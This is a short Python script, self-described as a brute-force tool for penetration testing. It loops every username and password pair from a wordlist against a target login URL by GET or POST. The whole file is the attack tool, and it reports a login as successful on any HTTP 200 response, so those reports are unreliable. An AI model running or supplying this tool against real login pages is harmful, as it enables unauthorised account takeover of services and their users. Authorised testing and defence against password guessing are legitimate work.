import requests
import argparse

def brute_force(username, password, target_url, method):
    data = {'username': username, 'password': password}
    
    if method.lower() == 'get':
        response = requests.get(target_url, params=data)
    elif method.lower() == 'post':
        response = requests.post(target_url, data=data)
    else:
        print("Invalid HTTP method specified. Use 'get' or 'post'.")
        return

    if response.status_code == 200: 
        print(f"Success - Username: {username}, Password: {password}")
    else:
        print(f"Failed - Username: {username}, Password: {password}")

def main():
    parser = argparse.ArgumentParser(description="Simple brute-force tool for penetration testing.")
    parser.add_argument("-w", "--wordlist", help="Path to the wordlist file", required=True)
    parser.add_argument("-t", "--target", help="Target URL", required=True)
    parser.add_argument("-m", "--method", help="HTTP method (get or post)", required=True)
    
    args = parser.parse_args()

    with open(args.wordlist, 'r') as f:
        wordlist = f.read().splitlines()

    for username in wordlist:
        for password in wordlist:
            brute_force(username, password, args.target, args.method)

if __name__ == "__main__":
    main()
